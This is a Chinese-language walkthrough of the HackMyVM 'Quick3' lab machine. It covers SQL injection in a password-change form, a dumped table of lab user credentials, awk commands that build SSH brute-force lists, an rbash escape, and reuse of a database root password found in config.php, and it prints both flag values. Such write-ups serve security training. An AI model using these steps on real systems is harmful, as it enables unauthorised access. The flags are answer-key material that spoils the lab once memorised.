# Quick3

2025.03.27 https://hackmyvm.eu/machines/machine.php?vm=Quick3

[video](https://www.bilibili.com/video/BV1KnZGYcEMV/?spm_id_from=333.1387.collection.video_card.click&vd_source=aed2f374c732513d2e535afafb1fd2ec)

## Ip

192.168.5.39

## Scan

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

http://192.168.5.39/customer/ 注册一个用户后，发现在用户修改密码的功能点存在 sql 注入。

sqlmap 跑出了注入点，拿到了 users 表内容，后台中没有上传文件的地方，直接用这几个用户凭据爆一下 ssh：

```
+----+-----------------------------------+-----------------+--------------------+----------+
| id | email                             | name            | password           | role     |
+----+-----------------------------------+-----------------+--------------------+----------+
|  1 | test1@qq.com                      | test            | test               | admin    |
|  2 | nick.greenhorn@quick.hmv          | Nick Greenhorn  | H01n8X0fiiBhsNbI   | employee |
|  3 | andrew.speed@quick.hmv            | Andrew Speed    | oyS6518WQxGK8rmk   | employee |
|  4 | jack.black@email.hmv              | Jack Black      | 2n5kKKcvumiR7vrz   | customer |
|  5 | mike.cooper@quick.hmv             | Mike Cooper     | 6G3UCx6aH6UYvJ6m   | employee |
|  6 | j.doe@email.hmv                   | John Doe        | k2I9CR15E9O4G1KI   | customer |
|  7 | jane_smith@email.hmv              | Jane Smith      | 62D4hqCrjjNCuxOj   | customer |
|  8 | frank@email.hmv                   | Frank Stein     | w9Y021wsWRdkwuKf   | customer |
|  9 | fred.flinstone@email.hmv          | Fred Flinstone  | 1vC35FcnMfmGsI5c   | customer |
| 10 | s.hutson@email.hmv                | Sandra Hutson   | fL01z7z8MawnIdAq   | customer |
| 11 | b.clintwood@email.hmv             | Bill Clintwood  | vDKZtVfZuaLN8BEB7f | customer |
| 12 | j.bond@email.hmv                  | James Bond      | iakbmsaEVHhN2XoaXB | customer |
| 13 | d.trumpet@email.hmv               | Donald Trumpet  | wv5awQybZTdvZeMGPb | customer |
| 14 | m.monroe@email.hmv                | Michelle Monroe | wv5awQybZTdvZeMGPb | customer |
| 15 | jeff.anderson@quick.hmv           | Jeff Anderson   | Kn4tLAPWDbFK9Zv2   | employee |
| 16 | lee.ka-shingn@quick.hmv@quick.hmv | Lee Ka-shing    | SS2mcbW58a8reLYQ   | employee |
| 17 | laura.johnson@email.hmv           | Laura Johnson   | e8v3JQv3QVA3aNrD   | customer |
| 18 | coos.busters@quick.hmv            | Coos Busters    | 8RMVrdd82n5ymc4Z   | employee |
| 19 | n.down@email.hmv                  | Neil Down       | STUK2LNwNRU24YZt   | customer |
| 20 | t.green@email.hmv                 | Teresa Green    | mvQnTzCX9wcNtzbW   | customer |
| 21 | k.ball@email.hmv                  | Krystal Ball    | A9n3XMuB9XmFmgr5   | customer |
| 22 | juan.mecanico@quick.hmv           | Juan Mecánico   | DX5cM3yFg6wJgdYb   | employee |
| 23 | john.smith@quick.hmv              | John Smith      | yT9Hy2fhX7VhmEkj   | employee |
| 24 | misty.cupp@email.hmv              | Misty Cupp      | aCSKXmzhHL9XPnqr   | customer |
| 25 | lara.johnson@quick.hmv            | Lara Johnson    | GUFTV4ERd7QAexxw   | employee |
| 26 | j.daniels@email.hmv               | James Daniels   | fMYFNFzCRMF6ceKe   | customer |
| 27 | dick_swett@email.hmv              | Dick Swett      | w5dWfAqNNLtWVvcW   | customer |
| 28 | a.lucky@email.hmv                 | Anna Lucky      | FVYtCpc8FGVHEBXV   | customer |
| 29 | test@qq.com                       | test            | test               | customer |
+----+-----------------------------------+-----------------+--------------------+----------+

cat tab|awk -F '|' '{print $3}' | awk -F '.' '{print $1}' | sed 's/ //g' > username
cat tab|awk -F '|' '{print $5}' | sed 's/ //g' > passwd
```

使用 mike:6G3UCx6aH6UYvJ6m 登陆 ssh，拿到 user flag：

```
HMV{717f274ee66f8541a3031f175f615e72}
```

有 rbash，重新 ssh 登陆：

```
ssh mike@192.168.5.39 -t "bash --noprofile"
```

枚举后，发现数据库的连接配置文件：

```
mike@quick3:/var/www/html/customer$ cat config.php
<?php
// config.php
$conn = new mysqli('localhost', 'root', 'fastandquicktobefaster', 'quick');

// Check connection
if ($conn->connect_error) {
	die("Connection failed: " . $conn->connect_error);
}
?>
```

尝试用密码 fastandquicktobefaster 切换到 root，成功，拿到 root flag：

```
HMV{f178761104e933f9341f13f64b38538a}
```
